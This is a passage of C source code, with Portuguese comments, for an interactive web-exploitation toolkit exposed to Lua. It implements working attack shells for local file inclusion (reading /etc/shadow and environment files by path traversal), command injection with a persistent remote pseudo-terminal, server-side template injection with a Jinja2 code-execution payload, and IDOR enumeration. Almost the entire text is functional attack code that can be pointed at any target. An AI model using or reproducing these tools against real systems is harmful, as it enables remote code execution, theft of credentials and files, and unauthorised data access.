        }
        printf("\n");
        free(body); free(line);
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/xss] sessão encerrada — %d reflexão(ões) confirmada(s)\033[0m\n\n", reflected);
    lua_pushinteger(L, reflected); return 1;
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.lfi — LFI REPL: lê arquivos do servidor via path traversal
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_lfi(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;33m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║  exploit.lfi — Local File Inclusion REPL                     ║\033[0m\n");
    printf("\033[1;33m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();
    printf("\033[0;90m[*] Digite o caminho do arquivo. Comandos: .linux  .win  .wrap  .help  .exit\033[0m\n\n");

    /* detecta profundidade de traversal */
    int depth = 5;
    printf("\033[0;90m[*] Detectando profundidade de traversal...\033[0m\n");
    for (int d = 1; d <= 8; d++) {
        char probe[256] = "../";
        for (int i = 1; i < d; i++) strncat(probe, "../", sizeof(probe)-strlen(probe)-1);
        strncat(probe, "etc/passwd", sizeof(probe)-strlen(probe)-1);
        char enc[512]; exploit_urlencode(probe, enc, sizeof(enc));
        char *body = exploit_fetch(target, enc, NULL);
        if (body && strstr(body, "root:x:0:0")) {
            depth = d;
            printf("\033[1;32m[✓] Profundidade %d (%s) funciona\033[0m\n\n", d, probe);
            free(body); break;
        }
        if (body) free(body);
    }

    char traversal[64] = "../";
    for (int i = 1; i < depth; i++) strncat(traversal, "../", sizeof(traversal)-strlen(traversal)-1);

    int files_read = 0;
    while (1) {
        char *line = exploit_readline("\033[1;33mlfi\033[0m\033[1;37m>\033[0m ");
        if (!line || g_exploit_sigint) {
            if (g_exploit_sigint) { g_exploit_sigint=0; if(line)free(line); continue; }
            break;
        }
        while (*line==' ') line++;
        size_t ll=strlen(line); while(ll>0&&line[ll-1]==' ')line[--ll]=0;
        if (!*line){free(line);continue;}
        if (strcmp(line,".exit")==0||strcmp(line,".quit")==0){free(line);break;}

        char filepath[1024] = {0};

        if (strcmp(line,".linux")==0) {
            const char *files[]={"etc/passwd","etc/shadow","etc/hosts",
                "proc/version","proc/self/environ","etc/nginx/nginx.conf",
                "etc/apache2/apache2.conf","var/www/html/config.php",NULL};
            printf("\033[0;90m  Arquivos Linux comuns:\033[0m\n");
            for(int i=0;files[i];i++) printf("    %s\n",files[i]);
            printf("\n"); free(line); continue;
        } else if (strcmp(line,".win")==0) {
            const char *files[]={
                "windows/win.ini","windows/system32/drivers/etc/hosts",
                "boot.ini","inetpub/wwwroot/web.config",NULL};
            printf("\033[0;90m  Arquivos Windows comuns:\033[0m\n");
            for(int i=0;files[i];i++) printf("    %s\n",files[i]);
            printf("\n"); free(line); continue;
        } else if (strncmp(line,".wrap",5)==0) {
            /* .wrap [caminho] — gera php://filter e tenta fetch */
            const char *wpath = line+5; while(*wpath==' ')wpath++;
            char wbuf[256]={0};
            if (!*wpath) {
                /* pede se não passou inline */
                char *f = exploit_readline("  caminho (ex: /var/www/html/index.php): ");
                if (f) { strncpy(wbuf,f,255); free(f); wpath=wbuf; }
            }
            if (*wpath) {
                /* monta filter */
                char filter[512];
                snprintf(filter,sizeof(filter),
                    "php://filter/convert.base64-encode/resource=%s",wpath);
                printf("  \033[1;36m[filter]\033[0m %s\n",filter);
                /* tenta fetch */
                char enc[1024]; exploit_urlencode(filter,enc,sizeof(enc));
                char *body2 = exploit_fetch(target,enc,NULL);
                if (body2 && strlen(body2)>20 &&
                    !strstr(body2,"No such") && !strstr(body2,"Errno")) {
                    /* extrai base64 do body */
                    char *b64start=NULL; char *p2=body2;
                    /* procura bloco de caracteres base64 válidos */
                    while(*p2) {
                        if((*p2>='A'&&*p2<='Z')||(*p2>='a'&&*p2<='z')||
                           (*p2>='0'&&*p2<='9')||*p2=='+'||*p2=='/'||*p2=='=') {
                            if(!b64start) b64start=p2;
                        } else {
                            if(b64start&&(int)(p2-b64start)>40) break;
                            b64start=NULL;
                        }
                        p2++;
                    }
                    if(b64start&&(int)(p2-b64start)>40) {
                        printf("  \033[1;32m[✓] Base64 obtido (%d bytes) — decodifique com crypto.b64dec()\033[0m\n",
                            (int)(p2-b64start));
                        /* mostra primeiros 80 chars */
                        char preview[82]={0}; int pl=(int)(p2-b64start);
                        memcpy(preview,b64start,pl<80?pl:80);
                        printf("  %.80s%s\n\n",preview,pl>80?"...":"");
                    } else {
                        printf("  \033[0;90m[?] Resposta recebida mas sem base64 claro — servidor pode não suportar php://filter\033[0m\n\n");
                    }
                } else {
                    printf("  \033[0;90m[✗] php://filter não funcionou neste servidor\033[0m\n\n");
                }
                if(body2) free(body2);
            }
            free(line); continue;
        } else if (strcmp(line,".help")==0) {
            printf("\033[0;90m  <path>    — caminho a ler, ex: etc/passwd ou /etc/passwd\033[0m\n");
            printf("\033[0;90m  .linux    — lista arquivos Linux úteis\033[0m\n");
            printf("\033[0;90m  .win      — lista arquivos Windows úteis\033[0m\n");
            printf("\033[0;90m  .wrap     — gera php://filter para base64\033[0m\n");
            printf("\033[0;90m  .exit     — sair\033[0m\n\n");
            free(line); continue;
        } else {
            /* remove / inicial */
            const char *p = line; if (*p=='/') p++;
            if (strncmp(p,"php://",6)==0||strncmp(p,"file://",7)==0)
                snprintf(filepath,sizeof(filepath),"%s",p);
            else
                snprintf(filepath,sizeof(filepath),"%s%s",traversal,p);
        }

        char enc[2048]; exploit_urlencode(filepath,enc,sizeof(enc));
        char *body = exploit_fetch(target,enc,NULL);
        if (!body){printf("\033[1;31m[!] Sem resposta\033[0m\n\n");free(line);continue;}

        /* erro explícito do servidor */
        int is_err = strstr(body,"No such file")||strstr(body,"not found")||
                     strstr(body,"Errno 2")||strstr(body,"Permission denied")||
                     strstr(body,"invalid path")||strstr(body,"404");

        /* strip HTML completo: joga fora tudo, mantém só texto */
        static char lfi_clean[65536];
        {
            int ci=0, intag=0, last_nl=0;
            /* decodifica entidades comuns antes */
            for (int k=0; body[k] && ci<65530; k++) {
                if (body[k]=='<') { intag=1; continue; }
                if (intag) { if(body[k]=='>') intag=0; continue; }
                /* entidades */
                if (body[k]=='&') {
                    if (strncmp(body+k,"&lt;",4)==0)  { lfi_clean[ci++]='<'; k+=3; continue; }
                    if (strncmp(body+k,"&gt;",4)==0)  { lfi_clean[ci++]='>'; k+=3; continue; }
                    if (strncmp(body+k,"&amp;",5)==0) { lfi_clean[ci++]='&'; k+=4; continue; }
                    if (strncmp(body+k,"&#39;",5)==0) { lfi_clean[ci++]='\'';k+=4; continue; }
                }
                /* colapsa múltiplos \n em um */
                if (body[k]=='\n'||body[k]=='\r') {
                    if (!last_nl && ci>0) { lfi_clean[ci++]='\n'; last_nl=1; }
                    continue;
                }
                last_nl=0;
                lfi_clean[ci++]=body[k];
            }
            lfi_clean[ci]=0;
        }

        /* remove linhas que são claramente HTML/CSS/nav residual */
        static char lfi_filtered[65536];
        {
            int fi=0;
            char *p = lfi_clean;
            while (*p) {
                char *nl = strchr(p,'\n'); if(!nl) nl=p+strlen(p);
                int len=(int)(nl-p);
                /* pula linhas com padrões de HTML/CSS */
                int skip=0;
                if (len>0) {
                    char tmp[512]={0}; if(len<511)memcpy(tmp,p,len);
                    if (strstr(tmp,"{font-family")||strstr(tmp,"{background")||
                        strstr(tmp,"margin:")||strstr(tmp,"padding:")||
                        strstr(tmp,"color:#")||strstr(tmp,"border:")||
                        strstr(tmp,"text-decoration")||strstr(tmp,"max-width")||
                        strstr(tmp,".nav{")||strstr(tmp,".box{")||strstr(tmp,".err{"))
                        skip=1;
                    /* linha só com nav links (todas palavras são links conhecidos) */
                    if (!skip && len < 80) {
                        int only_nav=1;
                        const char *nav[]={"Home","Search","Login","Exec",
                            "File","Notes","Template","EasyShop",NULL};
                        char scan[512]={0}; memcpy(scan,tmp,len<511?len:510);
                        for(int ni=0;nav[ni];ni++) {
                            char *found=strstr(scan,nav[ni]);
                            if(found) { int fl=strlen(nav[ni]); memmove(found,found+fl,strlen(found+fl)+1); }
                        }
                        /* se restou só espaço/vazio, era linha de nav */
                        int leftover=0;
                        for(int si=0;scan[si];si++) if(scan[si]>' '){leftover=1;break;}
                        if(!leftover) skip=1;
                    }
                }
                if (!skip && len>0) {
                    if (fi>0 && lfi_filtered[fi-1]!='\n') lfi_filtered[fi++]='\n';
                    memcpy(lfi_filtered+fi,p,len); fi+=len;
                }
                p=(*nl)?nl+1:nl;
                if (fi>=65530) break;
            }
            lfi_filtered[fi]=0;
            /* trim leading newlines */
            char *start=lfi_filtered; while(*start=='\n')start++;
            if(start>lfi_filtered) memmove(lfi_filtered,start,strlen(start)+1);
        }

        int content_len = (int)strlen(lfi_filtered);
        int ok = !is_err && content_len > 10;

        if (ok) {
            printf("\033[1;32m[✓] %s\033[0m\n", filepath);
            printf("%s\n", lfi_filtered);
            files_read++;
        } else if (is_err) {
            /* extrai mensagem de erro limpa */
            char *errmsg = strstr(body,"Errno"); if(!errmsg) errmsg=strstr(body,"No such");
            if(!errmsg) errmsg=strstr(body,"not found");
            if (errmsg) {
                char emsg[128]={0}; int ei=0;
                for(;errmsg[ei]&&errmsg[ei]!='<'&&ei<127;ei++) emsg[ei]=errmsg[ei];
                printf("\033[0;90m[✗] %s\033[0m\n", emsg);
            } else {
                printf("\033[0;90m[✗] Arquivo não encontrado\033[0m\n");
            }
        } else {
            printf("\033[0;90m[✗] Sem conteúdo reconhecível (%d bytes)\033[0m\n", content_len);
        }
        printf("\n");
        free(body); free(line);
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/lfi] sessão encerrada — %d arquivo(s) lido(s)\033[0m\n\n", files_read);
    lua_pushinteger(L, files_read); return 1;
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.rce — Command Injection pseudo-terminal REPL
   Mantém cwd entre comandos via "cd $CWD && $CMD"
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_rce(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;31m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;31m║  exploit.rce — Remote Code Execution Shell                   ║\033[0m\n");
    printf("\033[1;31m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();
    printf("\033[0;90m[*] Shell interativo via command injection. cd persiste entre comandos.\033[0m\n\n");

    /* detecta delimitador de injeção */
    const char *seps[] = {";","&&","|","`","$(","&",NULL};
    const char *working_sep = ";";
    printf("\033[0;90m[*] Detectando separador de injeção...\033[0m\n");
    for (int si=0; seps[si]; si++) {
        char probe[256];
        if (strcmp(seps[si],"$(")==0)
            snprintf(probe,sizeof(probe),"x$(echo+RCEOK)x");
        else
            snprintf(probe,sizeof(probe),"x%secho+RCEOK",seps[si]);
        char enc[512]; exploit_urlencode(probe,enc,sizeof(enc));
        char *body = exploit_fetch(target,enc,NULL);
        if (body && strstr(body,"RCEOK")) {
            working_sep = seps[si];
            printf("\033[1;32m[✓] Separador: '%s'\033[0m\n\n", working_sep);
            free(body); break;
        }
        if (body) free(body);
    }

    char cwd[512] = "/";
    /* tenta obter cwd real */
    {
        char probe[256]; snprintf(probe,sizeof(probe),"x%spwd",working_sep);
        char enc[512]; exploit_urlencode(probe,enc,sizeof(enc));
        char *body = exploit_fetch(target,enc,NULL);
        if (body) {
            /* extrai linha começando com / */
            char *p = body;
            while (*p) {
                char *nl = strchr(p,'\n'); if (!nl) nl = p+strlen(p);
                int len=(int)(nl-p);
                if (len>1 && len<500 && p[0]=='/') {
                    /* strip tags */
                    char clean[512]={0}; int ci=0,intag=0;
                    for(int k=0;k<len&&ci<510;k++){
                        if(p[k]=='<')intag=1;
                        else if(p[k]=='>')intag=0;
                        else if(!intag)clean[ci++]=p[k];
                    }
                    clean[ci]=0;
                    char *tc=clean; while(*tc==' '||*tc=='\r')tc++;
                    if (*tc=='/')  { strncpy(cwd,tc,sizeof(cwd)-1); break; }
                }
                p = *nl ? nl+1 : nl;
            }
            free(body);
        }
    }
    printf("\033[0;90m[*] cwd inicial: %s\033[0m\n\n", cwd);

    int cmds_run = 0;
    while (1) {
        /* prompt mostra cwd */
        char short_cwd[40]; strncpy(short_cwd, cwd, 39);
        char prompt[128]; snprintf(prompt,sizeof(prompt),
            "\033[1;32mrce\033[0m:\033[1;34m%s\033[0m\033[1;37m$\033[0m ", short_cwd);
        char *line = exploit_readline(prompt);
        if (!line || g_exploit_sigint) {
            if (g_exploit_sigint) { g_exploit_sigint=0; if(line)free(line); continue; }
            break;
        }
        while (*line==' ')line++;
        size_t ll=strlen(line); while(ll>0&&line[ll-1]==' ')line[--ll]=0;
        if(!*line){free(line);continue;}
        if(strcmp(line,".exit")==0||strcmp(line,"exit")==0||strcmp(line,"quit")==0){free(line);break;}

        /* cd local — atualiza cwd e injeta no próximo comando */
        if (strncmp(line,"cd ",3)==0) {
            const char *dest = line+3;
            while(*dest==' ')dest++;
            char new_cwd[512]={0};
            if (dest[0]=='/') {
                strncpy(new_cwd,dest,sizeof(new_cwd)-1);
            } else if (strcmp(dest,"..")==0) {
                char *sl = strrchr(cwd,'/');
                if (sl && sl!=cwd) { *sl=0; strncpy(new_cwd,cwd,sizeof(new_cwd)-1); *sl='/'; }
                else strncpy(new_cwd,"/",sizeof(new_cwd)-1);
            } else {
                snprintf(new_cwd,sizeof(new_cwd),"%s/%s",
                    strcmp(cwd,"/")==0?"":cwd, dest);
            }
            /* verifica se existe */
            char verify[1024];
            snprintf(verify,sizeof(verify),"x%scd %s && pwd",working_sep,new_cwd);
            char enc[2048]; exploit_urlencode(verify,enc,sizeof(enc));
            char *body = exploit_fetch(target,enc,NULL);
            if (body && strstr(body,new_cwd)) {
                strncpy(cwd,new_cwd,sizeof(cwd)-1);
                printf("\033[0;90m→ %s\033[0m\n\n", cwd);
            } else {
                printf("\033[1;31m[!] cd falhou: %s\033[0m\n\n", new_cwd);
            }
            if(body)free(body); free(line); continue;
        }

        /* injeta: cd $CWD && $CMD */
        char full_cmd[2048];
        if (strcmp(cwd,"/")==0)
            snprintf(full_cmd,sizeof(full_cmd),"x%s%s 2>&1",working_sep,line);
        else
            snprintf(full_cmd,sizeof(full_cmd),"x%scd %s && %s 2>&1",working_sep,cwd,line);

        char enc[4096]; exploit_urlencode(full_cmd,enc,sizeof(enc));
        char *body = exploit_fetch(target,enc,NULL);
        if (!body){printf("\033[1;31m[!] Sem resposta\033[0m\n\n");free(line);continue;}

        /* strip HTML e exibe */
        char clean[16384]={0}; int ci=0,intag=0;
        for(int k=0;body[k]&&ci<16382;k++){
            if(body[k]=='<')intag=1;
            else if(body[k]=='>')intag=0;
            else if(!intag){
                if(body[k]=='&'){
                    if(strncmp(body+k,"&lt;",4)==0){clean[ci++]='<';k+=3;}
                    else if(strncmp(body+k,"&gt;",4)==0){clean[ci++]='>';k+=3;}
                    else if(strncmp(body+k,"&amp;",5)==0){clean[ci++]='&';k+=4;}
                    else if(strncmp(body+k,"&#10;",5)==0){clean[ci++]='\n';k+=4;}
                    else clean[ci++]=body[k];
                } else clean[ci++]=body[k];
            }
        }
        /* trim início/fim */
        char *out=clean; while(*out=='\n'||*out=='\r'||*out==' ')out++;
        size_t olen=strlen(out); while(olen>0&&(out[olen-1]=='\n'||out[olen-1]=='\r'||out[olen-1]==' '))out[--olen]=0;
        if(*out) printf("\033[1;37m%s\033[0m\n\n", out);
        else printf("\033[0;90m(sem output)\033[0m\n\n");

        free(body); free(line); cmds_run++;
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/rce] sessão encerrada — %d comando(s) executado(s)\033[0m\n\n", cmds_run);
    lua_pushinteger(L, cmds_run); return 1;
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.ssti — Server-Side Template Injection REPL
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_ssti(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;36m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;36m║  exploit.ssti — Template Injection REPL                      ║\033[0m\n");
    printf("\033[1;36m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();
    printf("\033[0;90m[*] Comandos: .detect  .rce <cmd>  .env  .help  .exit\033[0m\n\n");

    /* detecta engine */
    typedef struct { const char *payload; const char *expected; const char *engine; } SstiProbe;
    SstiProbe probes[] = {
        {"{{7*'7'}}",        "7777777",  "Jinja2/Twig"},
        {"${7*7}",           "49",       "Freemarker/Velocity"},
        {"<%= 7*7 %>",       "49",       "ERB (Ruby)"},
        {"{{7*7}}",          "49",       "Jinja2/Twig (aritmética)"},
        {"#{7*7}",           "49",       "Ruby/Slim"},
        {NULL,NULL,NULL}
    };
    const char *engine = "desconhecido";
    printf("\033[0;90m[*] Detectando engine de template...\033[0m\n");
    for (int pi=0; probes[pi].payload; pi++) {
        char enc[512]; exploit_urlencode(probes[pi].payload,enc,sizeof(enc));
        char *body = exploit_fetch(target,enc,NULL);
        if (body && strstr(body,probes[pi].expected)) {
            engine = probes[pi].engine;
            printf("\033[1;32m[✓] Engine: %s\033[0m\n\n", engine);
            free(body); break;
        }
        if(body)free(body);
    }
    if (strcmp(engine,"desconhecido")==0)
        printf("\033[1;33m[?] Engine não detectado — tente payloads manuais\033[0m\n\n");

    int exprs = 0;
    while (1) {
        char prompt[64]; snprintf(prompt,sizeof(prompt),
            "\033[1;36mssti(%s)\033[0m\033[1;37m>\033[0m ", engine);
        char *line = exploit_readline(prompt);
        if(!line)break;
        while(*line==' ')line++;
        size_t ll=strlen(line); while(ll>0&&line[ll-1]==' ')line[--ll]=0;
        if(!*line){free(line);continue;}
        if(strcmp(line,".exit")==0||strcmp(line,".quit")==0){free(line);break;}

        char payload[2048]={0};

        if(strcmp(line,".detect")==0) {
            for(int pi=0;probes[pi].payload;pi++){
                char enc[512]; exploit_urlencode(probes[pi].payload,enc,sizeof(enc));
                char *body=exploit_fetch(target,enc,NULL);
                if(body&&strstr(body,probes[pi].expected))
                    printf("  \033[1;32m[✓] %-20s → %s → %s\033[0m\n",
                        probes[pi].payload,probes[pi].expected,probes[pi].engine);
                else
                    printf("  \033[0;90m[✗] %-20s\033[0m\n",probes[pi].payload);
                if(body)free(body);
            }
            printf("\n"); free(line); continue;
        } else if(strncmp(line,".rce ",5)==0) {
            /* wrappa em payload RCE para engines comuns */
            const char *cmd=line+5;
            snprintf(payload,sizeof(payload),
                "{{''.__class__.__mro__[1].__subclasses__()[396]('%s',shell=True,stdout=-1).communicate()[0].strip()}}",
                cmd);
            printf("\033[0;90m[*] Payload Jinja2 RCE: %s\033[0m\n", payload);
        } else if(strcmp(line,".env")==0) {
            snprintf(payload,sizeof(payload),"{{config}}");
        } else if(strcmp(line,".help")==0) {
            printf("\033[0;90m  <expr>       — expressão template, ex: {{7*7}} ou ${7*7}\033[0m\n");
            printf("\033[0;90m  .detect      — re-testa todos os engines\033[0m\n");
            printf("\033[0;90m  .rce <cmd>   — payload RCE via Jinja2 (ex: .rce id)\033[0m\n");
            printf("\033[0;90m  .env         — dump config/env via {{config}}\033[0m\n");
            printf("\033[0;90m  .exit        — sair\033[0m\n\n");
            free(line); continue;
        } else {
            snprintf(payload,sizeof(payload),"%s",line);
        }

        char enc[4096]; exploit_urlencode(payload,enc,sizeof(enc));
        char *body=exploit_fetch(target,enc,NULL);
        if(!body){printf("\033[1;31m[!] Sem resposta\033[0m\n\n");free(line);continue;}

        /* strip HTML */
        char clean[8192]={0}; int ci=0,intag=0;
        for(int k=0;body[k]&&ci<8190;k++){
            if(body[k]=='<')intag=1;
            else if(body[k]=='>')intag=0;
            else if(!intag)clean[ci++]=body[k];
        }
        char *out=clean; while(*out=='\n'||*out=='\r'||*out==' ')out++;
        size_t olen=strlen(out); while(olen>0&&(out[olen-1]=='\n'||out[olen-1]=='\r'))out[--olen]=0;
        printf("\033[1;36m→ %s\033[0m\n\n", *out?out:"(sem output)");
        free(body); free(line); exprs++;
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/ssti] sessão encerrada — %d expressão(ões) avaliada(s)\033[0m\n\n", exprs);
    lua_pushinteger(L, exprs); return 1;
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.idor — IDOR enumeration REPL
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_idor(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;33m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║  exploit.idor — IDOR Enumeration REPL                        ║\033[0m\n");
    printf("\033[1;33m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();
    printf("\033[0;90m[*] Comandos: .scan <inicio> <fim>  .get <id>  .diff <id1> <id2>  .help  .exit\033[0m\n\n");

    /* baseline */
    char *baseline = exploit_fetch(target,"0",NULL);
    size_t baseline_len = baseline ? strlen(baseline) : 0;
    printf("\033[0;90m[*] Baseline (id=0): %zu bytes\033[0m\n\n", baseline_len);
    if(baseline)free(baseline);

    int anomalies = 0;
    while (1) {
        char *line = exploit_readline("\033[1;33midor\033[0m\033[1;37m>\033[0m ");
        if(!line)break;
        while(*line==' ')line++;
        size_t ll=strlen(line); while(ll>0&&line[ll-1]==' ')line[--ll]=0;
        if(!*line){free(line);continue;}
        if(strcmp(line,".exit")==0||strcmp(line,".quit")==0){free(line);break;}

        if(strncmp(line,".scan ",6)==0) {
            int from=0,to=50;
            sscanf(line+6,"%d %d",&from,&to);
            if(to-from>200)to=from+200;
            printf("\033[0;90m[*] Scanning IDs %d..%d...\033[0m\n",from,to);
            for(int id=from;id<=to;id++){
                char idstr[32]; snprintf(idstr,sizeof(idstr),"%d",id);
                char *body=exploit_fetch(target,idstr,NULL);
                if(!body)continue;
                size_t blen=strlen(body);
                long diff=(long)blen-(long)baseline_len;
                int anomaly=(blen>100)&&(diff>100||diff<-100)&&
                             strstr(body,"404")==NULL&&strstr(body,"not found")==NULL;
                if(anomaly){
                    /* strip HTML para preview */
                    char clean[256]={0}; int ci=0,intag=0;
                    for(int k=0;body[k]&&ci<254;k++){
                        if(body[k]=='<')intag=1;
                        else if(body[k]=='>')intag=0;
                        else if(!intag)clean[ci++]=body[k];
                    }
                    char *tc=clean; while(*tc==' '||*tc=='\n')tc++;
                    printf("  \033[1;32m[ID %3d] %zu bytes (diff %+ld) — %.*s\033[0m\n",
                        id,(size_t)blen,diff,60,tc);
                    anomalies++;
                }
                free(body);
            }
            printf("\n");
        } else if(strncmp(line,".get ",5)==0) {
            const char *id=line+5;
            char *body=exploit_fetch(target,id,NULL);
            if(body){
                char clean[4096]={0}; int ci=0,intag=0;
                for(int k=0;body[k]&&ci<4094;k++){
                    if(body[k]=='<')intag=1;
                    else if(body[k]=='>')intag=0;
                    else if(!intag)clean[ci++]=body[k];
                }
                char *out=clean; while(*out=='\n'||*out==' ')out++;
                printf("\033[1;36m[ID %s]\033[0m\n%s\n\n",id,out);
                free(body);
            }
        } else if(strncmp(line,".diff ",6)==0) {
            int id1=0,id2=1; sscanf(line+6,"%d %d",&id1,&id2);
            char s1[32],s2[32];
            snprintf(s1,sizeof(s1),"%d",id1); snprintf(s2,sizeof(s2),"%d",id2);
            char *b1=exploit_fetch(target,s1,NULL);
            char *b2=exploit_fetch(target,s2,NULL);
            printf("\033[0;90m  ID %d: %zu bytes\033[0m\n",id1,b1?strlen(b1):0);
            printf("\033[0;90m  ID %d: %zu bytes\033[0m\n",id2,b2?strlen(b2):0);
            if(b1&&b2){
                long d=(long)strlen(b2)-(long)strlen(b1);
                printf("  Diferença: %+ld bytes\n\n",d);
            }
            if(b1)free(b1); if(b2)free(b2);
        } else if(strcmp(line,".help")==0) {
            printf("\033[0;90m  <id>              — busca ID direto, ex: 42\033[0m\n");
            printf("\033[0;90m  .scan <ini> <fim> — escaneia range, ex: .scan 1 100\033[0m\n");
            printf("\033[0;90m  .get <id>         — mostra conteúdo do ID\033[0m\n");
            printf("\033[0;90m  .diff <id1> <id2> — compara tamanho de dois IDs\033[0m\n");
            printf("\033[0;90m  .exit             — sair\033[0m\n\n");
            free(line); continue;
        } else {
            /* ID direto */
            char *body=exploit_fetch(target,line,NULL);
            if(body){
                char clean[4096]={0}; int ci=0,intag=0;
                for(int k=0;body[k]&&ci<4094;k++){
                    if(body[k]=='<')intag=1; else if(body[k]=='>')intag=0;
                    else if(!intag)clean[ci++]=body[k];
                }
                char *out=clean; while(*out=='\n'||*out==' ')out++;
                printf("\033[1;36m[ID %s] %zu bytes\033[0m\n%s\n\n",line,strlen(body),out);
                free(body);
            }
        }
        free(line);
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/idor] sessão encerrada — %d anomalia(s) encontrada(s)\033[0m\n\n", anomalies);
    lua_pushinteger(L, anomalies); return 1;
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.help
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_help(lua_State *L) {
    (void)L;
